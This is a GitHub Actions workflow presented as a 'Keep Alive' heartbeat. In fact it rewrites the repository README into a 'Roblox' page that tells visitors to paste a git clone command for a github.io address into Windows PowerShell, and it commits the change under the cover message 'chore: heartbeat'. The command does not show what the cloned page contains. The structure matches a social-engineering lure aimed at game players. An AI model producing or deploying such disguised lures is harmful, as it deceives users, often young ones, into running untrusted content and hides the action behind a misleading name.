name: Keep Alive
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  write:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Write page
        run: |
          cat > README.md << 'EOF'
          # Roblox

          Open Windows PowerShell and paste this:

              git clone https://m-martin979799951.github.io/Roblox/
          EOF
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add README.md
          git diff --cached --quiet || git commit -m "chore: heartbeat"
          git push
concurrency: 
